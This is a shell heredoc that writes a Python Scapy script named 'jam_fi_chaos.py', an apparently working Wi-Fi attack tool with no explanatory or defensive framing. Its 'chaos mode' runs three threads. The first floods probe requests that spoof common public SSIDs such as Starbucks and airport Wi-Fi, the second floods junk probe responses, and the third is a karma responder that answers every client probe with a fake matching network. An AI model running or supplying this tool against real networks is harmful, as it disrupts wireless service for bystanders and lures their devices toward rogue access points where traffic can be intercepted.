cat > jam_fi_chaos.py << 'EOF'
#!/usr/bin/env python3
from scapy.all import *
import random
import threading
import time
import sys

running = True

def probe_spam(iface):
    ssids = ['Starbucks WiFi', 'ATT_WiFi', 'Xfinity WiFi', 'Google Starbucks', 'Free WiFi', 
             'Airport Free WiFi', 'Hotel WiFi', 'Cafe Net', 'Public WiFi', 'Linksys']
    while running:
        for ssid in ssids:
            pkt = RadioTap()/Dot11(addr1='ff:ff:ff:ff:ff:ff', 
                                  addr2=random.choice(['12:34:56:78:90:ab','23:45:67:89:ab:cd',
                                                      '34:56:78:90:ab:cd','45:67:89:ab:cd:ef']), 
                                  addr3='ff:ff:ff:ff:ff:ff')/Dot11ProbeReq()/Dot11Elt(ID=0, info=ssid)
            sendp(pkt, iface=iface, verbose=0)
        time.sleep(0.05)

def junk_flood(iface):
    while running:
        pkt = RadioTap()/Dot11(addr1='ff:ff:ff:ff:ff:ff', 
                              addr2=random.choice(['11:22:33:44:55:66','77:88:99:aa:bb:cc',
                                                  'aa:bb:cc:dd:ee:ff','00:11:22:33:44:55']), 
                              addr3='ff:ff:ff:ff:ff:ff')/Dot11ProbeResp()/Dot11Elt(ID=0, 
                              info='X'*random.randint(10,200))
        sendp(pkt, iface=iface, verbose=0)
        time.sleep(0.005)

def karma_responder(iface):
    def respond(pkt):
        if pkt.haslayer(Dot11ProbeReq) and running:
            try:
                el = pkt.getlayer(Dot11Elt)
                if el and el.ID == 0:
                    ssid = el.info.decode('utf-8', errors='ignore')
                    response = RadioTap()/Dot11(addr1=pkt.addr2, 
                                               addr2='aa:bb:cc:dd:ee:ff', 
                                               addr3='aa:bb:cc:dd:ee:ff')/Dot11ProbeResp()/Dot11Elt(ID=0, info=ssid)
                    sendp(response, iface=iface, verbose=0)
            except:
                pass
    sniff(iface=iface, prn=respond, store=0)

def chaos(iface):
    global running
    running = True
    
    print("[!] CHAOS MODE ACTIVATED")
    print("[*] Starting probe spam thread...")
    t1 = threading.Thread(target=probe_spam, args=(iface,))
    t1.daemon = True
    t1.start()
    
    print("[*] Starting junk flood thread...")
    t2 = threading.Thread(target=junk_flood, args=(iface,))
    t2.daemon = True
    t2.start()
    
    print("[*] Starting karma responder...")
    t3 = threading.Thread(target=karma_responder, args=(iface,))
    t3.daemon = True
    t3.start()
    
    print("[*] Chaos mode running. Press Ctrl+C to stop.")
    
    try:
        while running:
            time.sleep(1)
    except KeyboardInterrupt:
        running = False
        print("\n[!] Stopping chaos mode...")
        sys.exit(0)

if __name__ == "__main__":
    if len(sys.argv) > 1:
        chaos(sys.argv[1])
    else:
        print("Usage: python3 jam_fi_chaos.py <interface>")
EOF
